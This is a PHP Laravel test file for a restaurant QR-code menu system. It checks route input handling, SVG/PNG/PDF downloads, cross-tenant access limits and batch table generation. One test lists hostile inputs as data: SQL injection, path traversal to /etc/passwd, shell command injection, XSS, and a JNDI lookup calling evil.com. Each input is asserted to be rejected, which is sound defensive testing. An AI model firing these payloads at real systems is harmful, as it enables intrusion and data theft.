<?php

namespace Tests\Feature;

use App\Filament\Resources\CodigosQr\Pages\ListCodigosQr;
use App\Models\CodigoQr;
use App\Models\Restaurante;
use App\Models\Scopes\RestauranteScope;
use App\Models\User;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Livewire\Livewire;
use Tests\Concerns\ArmaEscenarioDePanel;
use Tests\TestCase;

class QrSubsystemAdversarialChallengeTest extends TestCase
{
    use ArmaEscenarioDePanel, RefreshDatabase;

    protected function tearDown(): void
    {
        RestauranteScope::setRestauranteId(null);

        parent::tearDown();
    }

    // =========================================================================
    // Category 1: /q/{codigo} Extreme Edge Cases & Injections
    // =========================================================================

    /**
     * Empty and whitespace-only codes or codes with leading/trailing whitespace return 404 with menu.no-disponible.
     */
    public function test_edge_case_empty_and_whitespace_codes_are_rejected(): void
    {
        // 1. Route /q/ without code (Laravel route matching check)
        $respRoot = $this->get('/q');
        $this->assertTrue(in_array($respRoot->getStatusCode(), [404, 301, 302], true));

        // 2. Raw unencoded space is rejected at HTTP Foundation level
        try {
            $rawSpaceResp = $this->get('/q/ ');
            $this->assertSame(404, $rawSpaceResp->getStatusCode());
        } catch (\Throwable $e) {
            $this->assertStringContainsString('Invalid URI', $e->getMessage());
        }

        // 3. Percent-encoded whitespace variants reaching application router
        $whitespacePayloads = [
            '%20',
            '%20%20',
            '%09',      // Tab
            '%0A',      // Line Feed (\n)
            '%0D%0A',   // Carriage Return + Line Feed (\r\n)
            '%20code',  // Leading space
            'code%20',  // Trailing space
            '%20code%20', // Both
        ];

        foreach ($whitespacePayloads as $payload) {
            $response = $this->get('/q/'.$payload);
            $this->assertSame(
                404,
                $response->getStatusCode(),
                "Whitespace payload '{$payload}' should return 404"
            );
            $response->assertViewIs('menu.no-disponible');
        }
    }

    /**
     * Control characters, null bytes, and non-printable bytes return 404 with menu.no-disponible.
     */
    public function test_edge_case_control_chars_and_null_bytes_are_rejected(): void
    {
        $controlPayloads = [
            '%00',              // Null byte
            'pre%00post',       // Null byte in middle
            '%1B',              // ESC
            '%07',              // BEL
            '%08',              // Backspace
            '%1F',              // Unit separator
            '%7F',              // DEL
        ];

        foreach ($controlPayloads as $payload) {
            $response = $this->get('/q/'.$payload);
            $this->assertSame(
                404,
                $response->getStatusCode(),
                "Control payload '{$payload}' should return 404"
            );
            $response->assertViewIs('menu.no-disponible');
        }
    }

    /**
     * Unicode, multi-byte, emojis, RTL, and accented characters return 404 with menu.no-disponible.
     */
    public function test_edge_case_unicode_multibyte_and_emojis_are_rejected(): void
    {
        $unicodePayloads = [
            'café',             // Accented Latin
            'München',          // Umlaut
            '🍕',                // Single emoji
            '🔥🍕🎉',            // Multiple emojis
            '%F0%9F%8D%95',     // URL-encoded pizza emoji
            'тест',             // Cyrillic
            '测试',             // Chinese
            'テスト',           // Japanese Katakana
            'تجربة',            // Arabic RTL
            'בדיקה',            // Hebrew RTL
            '１２３',           // Fullwidth numerals
            'ＡＢＣ',           // Fullwidth Latin
            'a%E2%80%8Bb',      // Zero-width space
        ];

        foreach ($unicodePayloads as $payload) {
            $response = $this->get('/q/'.$payload);
            $this->assertSame(
                404,
                $response->getStatusCode(),
                "Unicode payload '{$payload}' should return 404"
            );
            $response->assertViewIs('menu.no-disponible');
        }
    }

    /**
     * SQL injection patterns, command injections, and XSS payloads return 404 with menu.no-disponible without leaking or crashing.
     */
    public function test_edge_case_sql_injection_and_exploit_payloads_are_safely_rejected(): void
    {
        $exploitPayloads = [
            "' OR '1'='1",
            '%27%20OR%201=1%20--',
            "admin'--",
            'admin%27--',
            "1' UNION SELECT * FROM users--",
            '1; DROP TABLE codigos_qr;',
            '1%3B%20DROP%20TABLE%20codigos_qr%3B',
            '" OR ""="',
            "1' AND SLEEP(2)--",
            '../../etc/passwd',
            '..%2F..%2Fetc%2Fpasswd',
            ';cat /etc/passwd',
            '$(whoami)',
            '`whoami`',
            '<script>alert(1)</script>',
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            '${jndi:ldap://evil.com/x}',
        ];

        foreach ($exploitPayloads as $payload) {
            $response = $this->get('/q/'.$payload);
            $this->assertSame(
                404,
                $response->getStatusCode(),
                "Exploit payload '{$payload}' should safely return 404"
            );
            $response->assertViewIs('menu.no-disponible');
        }
    }

    /**
     * Boundary conditions for code length: 1 character, 16 characters, 17 characters, and extreme lengths (ReDoS check).
     */
    public function test_code_length_boundary_conditions_1_char_16_chars_17_chars_and_long_strings(): void
    {
        $restaurante = Restaurante::factory()->create([
            'slug' => 'pizzeria-napoli',
            'estado' => 'activo',
        ]);

        // 1. Valid 1-character code (boundary: lower bound)
        $qr1 = CodigoQr::factory()->create([
            'restaurante_id' => $restaurante->id,
            'codigo' => 'x',
            'activo' => true,
        ]);

        $resp1 = $this->get('/q/x');
        $resp1->assertStatus(302);
        $resp1->assertRedirect(route('menu.publico', ['slug' => 'pizzeria-napoli']));

        // Non-existent 1-character code returns 404
        $resp1Missing = $this->get('/q/y');
        $resp1Missing->assertNotFound();
        $resp1Missing->assertViewIs('menu.no-disponible');

        // 2. Valid 16-character code (boundary: upper bound)
        $code16 = 'Ab1_Cd2-Ef3_Gh4-';
        $this->assertSame(16, strlen($code16));

        $qr16 = CodigoQr::factory()->create([
            'restaurante_id' => $restaurante->id,
            'codigo' => $code16,
            'activo' => true,
        ]);

        $resp16 = $this->get('/q/'.$code16);
        $resp16->assertStatus(302);
        $resp16->assertRedirect(route('menu.publico', ['slug' => 'pizzeria-napoli']));

        // Non-existent 16-character code returns 404
        $resp16Missing = $this->get('/q/0123456789abcdef');
        $resp16Missing->assertNotFound();
        $resp16Missing->assertViewIs('menu.no-disponible');

        // 3. Invalid 17-character code (boundary: 1 past upper bound)
        $code17 = '12345678901234567';
        $this->assertSame(17, strlen($code17));
        $resp17 = $this->get('/q/'.$code17);
        $resp17->assertNotFound();
        $resp17->assertViewIs('menu.no-disponible');

        // 4. Extreme lengths (ReDoS / buffer stress test)
        $lengths = [100, 500, 2000, 10000];
        foreach ($lengths as $length) {
            $startTime = microtime(true);
            $longCode = str_repeat('a', $length);
            $respLong = $this->get('/q/'.$longCode);
            $elapsed = microtime(true) - $startTime;

            $this->assertSame(404, $respLong->getStatusCode());
            $respLong->assertViewIs('menu.no-disponible');
            $this->assertLessThan(1.0, $elapsed, "Regex verification on {$length} chars must take less than 1.0 second");
        }
    }

    // =========================================================================
    // Category 2: QR Download Formats & Payloads
    // =========================================================================

    /**
     * Authenticated download returns valid SVG markup with attachment header.
     */
    public function test_qr_download_svg_format_and_xml_markup(): void
    {
        $restaurante = $this->crearRestaurante('sushiya');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $qr = CodigoQr::factory()->create([
            'restaurante_id' => $restaurante->id,
            'codigo' => 'sushi01',
            'activo' => true,
        ]);

        $response = $this->actingAs($usuario)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qr, 'formato' => 'svg']));

        $response->assertOk();
        $response->assertHeader('Content-Type', 'image/svg+xml');
        $this->assertStringContainsString('attachment; filename="qr-sushi01.svg"', (string) $response->headers->get('Content-Disposition'));

        $content = $response->getContent();
        $this->assertStringContainsString('<svg', $content);
        $this->assertStringContainsString('</svg>', $content);
        $this->assertStringContainsString('xmlns="http://www.w3.org/2000/svg"', $content);
    }

    /**
     * Authenticated download returns valid PNG binary with correct magic bytes and parseable GD image.
     */
    public function test_qr_download_png_format_magic_bytes_and_valid_gd_image(): void
    {
        $restaurante = $this->crearRestaurante('burger-house');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $qr = CodigoQr::factory()->create([
            'restaurante_id' => $restaurante->id,
            'codigo' => 'burger01',
            'activo' => true,
        ]);

        $response = $this->actingAs($usuario)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qr, 'formato' => 'png']));

        $response->assertOk();
        $response->assertHeader('Content-Type', 'image/png');
        $this->assertStringContainsString('attachment; filename="qr-burger01.png"', (string) $response->headers->get('Content-Disposition'));

        $content = $response->getContent();

        // 1. Verify PNG standard magic bytes (\x89PNG\r\n\x1a\n)
        $this->assertStringStartsWith("\x89PNG\r\n\x1a\n", $content, 'Response must start with PNG 8-byte magic header');

        // 2. Verify GD can decode the binary into a valid image
        $image = @imagecreatefromstring($content);
        $this->assertNotFalse($image, 'Content must be decodable by GD imagecreatefromstring');
        $this->assertGreaterThan(50, imagesx($image), 'PNG width should be > 50px');
        $this->assertGreaterThan(50, imagesy($image), 'PNG height should be > 50px');
        imagedestroy($image);
    }

    /**
     * Printable sheet PDF view renders correctly, includes print CSS, and escapes dangerous inputs.
     */
    public function test_qr_download_printable_sheet_pdf_and_xss_escaping(): void
    {
        $restaurante = $this->crearRestaurante('xss-defense');
        // Malicious name to test Blade escaping
        $restaurante->update(['nombre' => '<script>alert("hacked")</script> Grill']);
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $qr = CodigoQr::factory()->deMesa('4')->create([
            'restaurante_id' => $restaurante->id,
            'nombre' => 'Mesa <b>VIP</b> 4',
            'mesa' => '4',
            'codigo' => 'xss004',
            'activo' => true,
        ]);

        $response = $this->actingAs($usuario)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qr, 'formato' => 'pdf']));

        $response->assertOk();
        $response->assertViewIs('qr.imprimible');
        $response->assertSee('@media print', false);
        $response->assertSee('btn-print', false);
        $response->assertSee('<svg', false);

        // Blade must have escaped the raw script and HTML tags
        $response->assertDontSee('<script>alert("hacked")</script>', false);
        $response->assertSee('&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt; Grill', false);
        $response->assertDontSee('Mesa <b>VIP</b> 4', false);
        $response->assertSee('Mesa &lt;b&gt;VIP&lt;/b&gt; 4', false);
    }

    /**
     * Invalid and dangerous download formats are rejected with 404.
     */
    public function test_qr_download_invalid_and_dangerous_formats_are_rejected(): void
    {
        $restaurante = $this->crearRestaurante('security-test');
        $usuario = $this->crearUsuario('propietario', $restaurante);
        $qr = CodigoQr::factory()->create(['restaurante_id' => $restaurante->id]);

        $invalidFormats = [
            'exe',
            'sh',
            'bat',
            'php',
            'SVG',      // Case sensitivity check
            'PNG',
            'PDF',
            'svg%00.exe',
            '%00',
            '..%2F..%2Fweb.php',
            'json',
        ];

        foreach ($invalidFormats as $fmt) {
            $response = $this->actingAs($usuario)
                ->get("/admin/codigos-qr/{$qr->id}/descargar/{$fmt}");

            $this->assertSame(
                404,
                $response->getStatusCode(),
                "Invalid format '{$fmt}' must return 404"
            );
        }
    }

    // =========================================================================
    // Category 3: Cross-Tenant Security & Privilege Boundaries
    // =========================================================================

    /**
     * Cross-tenant download attacks are strictly forbidden across all roles and formats.
     */
    public function test_cross_tenant_qr_download_permission_boundaries(): void
    {
        $restauranteAlpha = $this->crearRestaurante('tenant-alpha');
        $restauranteBeta = $this->crearRestaurante('tenant-beta');

        $userAlpha = $this->crearUsuario('propietario', $restauranteAlpha);
        $userBeta = $this->crearUsuario('editor', $restauranteBeta);
        $unaffiliatedUser = User::factory()->create();

        $qrAlpha = CodigoQr::factory()->create(['restaurante_id' => $restauranteAlpha->id, 'codigo' => 'alpha01']);
        $qrBeta = CodigoQr::factory()->create(['restaurante_id' => $restauranteBeta->id, 'codigo' => 'beta01']);

        // 1. Unauthenticated guest
        $this->get(route('codigos-qr.descargar', ['codigoQr' => $qrAlpha, 'formato' => 'svg']))
            ->assertRedirect('/admin/login');

        // 2. Unaffiliated authenticated user (belongs to 0 restaurants)
        $this->actingAs($unaffiliatedUser)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qrAlpha, 'formato' => 'svg']))
            ->assertForbidden();

        // 3. User Alpha tries to download Beta's QR in all 3 formats
        foreach (['svg', 'png', 'pdf'] as $format) {
            $this->actingAs($userAlpha)
                ->get(route('codigos-qr.descargar', ['codigoQr' => $qrBeta, 'formato' => $format]))
                ->assertForbidden();
        }

        // 4. User Beta tries to download Alpha's QR in all 3 formats
        foreach (['svg', 'png', 'pdf'] as $format) {
            $this->actingAs($userBeta)
                ->get(route('codigos-qr.descargar', ['codigoQr' => $qrAlpha, 'formato' => $format]))
                ->assertForbidden();
        }

        // 5. Active Filament Tenant context mismatch
        $this->actingAs($userAlpha);
        Filament::setTenant($restauranteAlpha);

        $responseMismatch = $this->get(route('codigos-qr.descargar', ['codigoQr' => $qrBeta, 'formato' => 'svg']));
        $responseMismatch->assertForbidden();
    }

    // =========================================================================
    // Category 4: Filament Batch Table Generation (generarLoteMesas)
    // =========================================================================

    /**
     * Large ranges (e.g. 1 to 50) generate unique codes matching regex and correct records.
     */
    public function test_filament_batch_table_creation_large_ranges(): void
    {
        $restaurante = $this->crearRestaurante('grand-hotel');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => 50,
            ])
            ->assertHasNoActionErrors()
            ->assertNotified();

        $this->assertDatabaseCount('codigos_qr', 50);

        $allQrs = CodigoQr::where('restaurante_id', $restaurante->id)->get();
        $this->assertCount(50, $allQrs);

        $distinctCodes = $allQrs->pluck('codigo')->unique();
        $this->assertCount(50, $distinctCodes, 'All 50 generated QR codes must be distinct');

        foreach ($allQrs as $qr) {
            $this->assertMatchesRegularExpression('/^[a-z0-9]{8}$/', $qr->codigo);
            $this->assertTrue($qr->activo);
            $this->assertSame((int) $qr->mesa, (int) str_replace('Mesa ', '', $qr->nombre));
        }
    }

    /**
     * Batch table creation skips intermediate pre-existing tables without altering them.
     */
    public function test_filament_batch_table_creation_skips_intermediate_existing_tables(): void
    {
        $restaurante = $this->crearRestaurante('cantina-mexicana');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        // Pre-create tables 2, 5, 8
        $mesasPreexistentes = [2, 5, 8];
        foreach ($mesasPreexistentes as $num) {
            CodigoQr::factory()->deMesa((string) $num)->create([
                'restaurante_id' => $restaurante->id,
                'nombre' => "Mesa {$num} Especial",
                'codigo' => "previa00{$num}",
                'activo' => true,
            ]);
        }

        $this->entrarAlPanel($usuario, $restaurante);

        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => 10,
            ])
            ->assertHasNoActionErrors()
            ->assertNotified();

        // 10 total tables: 3 pre-existing + 7 new
        $this->assertDatabaseCount('codigos_qr', 10);

        // Verify pre-existing tables were NOT modified
        foreach ($mesasPreexistentes as $num) {
            $this->assertDatabaseHas('codigos_qr', [
                'restaurante_id' => $restaurante->id,
                'mesa' => (string) $num,
                'nombre' => "Mesa {$num} Especial",
                'codigo' => "previa00{$num}",
            ]);
        }

        // Verify newly created tables (e.g. mesa 1, 3, 4, 6, 7, 9, 10)
        foreach ([1, 3, 4, 6, 7, 9, 10] as $num) {
            $this->assertDatabaseHas('codigos_qr', [
                'restaurante_id' => $restaurante->id,
                'mesa' => (string) $num,
                'nombre' => "Mesa {$num}",
                'activo' => true,
            ]);
        }
    }

    /**
     * Negative numbers and zero are rejected by validation.
     */
    public function test_filament_batch_table_creation_negative_numbers_and_zero_rejected(): void
    {
        $restaurante = $this->crearRestaurante('chophouse');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        // 1. Negative desde_mesa
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => -5,
                'hasta_mesa' => 10,
            ])
            ->assertHasActionErrors(['desde_mesa']);

        // 2. Zero desde_mesa (minValue is 1)
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 0,
                'hasta_mesa' => 10,
            ])
            ->assertHasActionErrors(['desde_mesa']);

        // 3. Negative hasta_mesa
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => -2,
            ])
            ->assertHasActionErrors(['hasta_mesa']);

        // 4. Zero hasta_mesa
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => 0,
            ])
            ->assertHasActionErrors(['hasta_mesa']);

        $this->assertDatabaseCount('codigos_qr', 0);
    }

    /**
     * Inverted bounds (hasta_mesa < desde_mesa) are rejected by validation.
     */
    public function test_filament_batch_table_creation_inverted_bounds_rejected(): void
    {
        $restaurante = $this->crearRestaurante('steak-paradise');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 25,
                'hasta_mesa' => 5,
            ])
            ->assertHasActionErrors(['hasta_mesa']);

        $this->assertDatabaseCount('codigos_qr', 0);
    }

    /**
     * Single table range (desde_mesa == hasta_mesa) creates exactly 1 table.
     */
    public function test_filament_batch_table_creation_single_table_range(): void
    {
        $restaurante = $this->crearRestaurante('solo-table');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 77,
                'hasta_mesa' => 77,
            ])
            ->assertHasNoActionErrors()
            ->assertNotified();

        $this->assertDatabaseCount('codigos_qr', 1);
        $this->assertDatabaseHas('codigos_qr', [
            'restaurante_id' => $restaurante->id,
            'mesa' => '77',
            'nombre' => 'Mesa 77',
            'activo' => true,
        ]);
    }

    /**
     * Batch table creation is idempotent: running twice over the same range skips all on second run.
     */
    public function test_filament_batch_table_creation_idempotency_running_twice_skips_all(): void
    {
        $restaurante = $this->crearRestaurante('idempotent-test');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        // First run: 1 to 5
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => 5,
            ])
            ->assertHasNoActionErrors();

        $this->assertDatabaseCount('codigos_qr', 5);

        // Second run: 1 to 5 again
        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => 1,
                'hasta_mesa' => 5,
            ])
            ->assertHasNoActionErrors();

        // Count must still be 5
        $this->assertDatabaseCount('codigos_qr', 5);
    }

    /**
     * Required field validation on batch modal.
     */
    public function test_filament_batch_table_creation_requires_mandatory_fields(): void
    {
        $restaurante = $this->crearRestaurante('validation-test');
        $usuario = $this->crearUsuario('propietario', $restaurante);

        $this->entrarAlPanel($usuario, $restaurante);

        Livewire::test(ListCodigosQr::class)
            ->callAction('generarLoteMesas', [
                'desde_mesa' => null,
                'hasta_mesa' => null,
            ])
            ->assertHasActionErrors(['desde_mesa', 'hasta_mesa']);

        $this->assertDatabaseCount('codigos_qr', 0);
    }

    /**
     * Owner can download their own inactive QR, but Comensal scan returns 404.
     */
    public function test_owner_can_download_inactive_qr_but_comensal_cannot_scan(): void
    {
        $restaurante = $this->crearRestaurante('draft-qrs');
        $propietario = $this->crearUsuario('propietario', $restaurante);

        $qrInactivo = CodigoQr::factory()->inactivo()->create([
            'restaurante_id' => $restaurante->id,
            'codigo' => 'draftqr01',
        ]);

        // 1. Owner can download SVG of inactive QR
        $svgResp = $this->actingAs($propietario)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qrInactivo, 'formato' => 'svg']));
        $svgResp->assertOk();
        $svgResp->assertHeader('Content-Type', 'image/svg+xml');

        // 2. Owner can download PNG of inactive QR
        $pngResp = $this->actingAs($propietario)
            ->get(route('codigos-qr.descargar', ['codigoQr' => $qrInactivo, 'formato' => 'png']));
        $pngResp->assertOk();
        $pngResp->assertHeader('Content-Type', 'image/png');

        // 3. Comensal scanning this inactive QR gets 404 menu.no-disponible
        $scanResp = $this->get('/q/draftqr01');
        $scanResp->assertNotFound();
        $scanResp->assertViewIs('menu.no-disponible');
    }
}
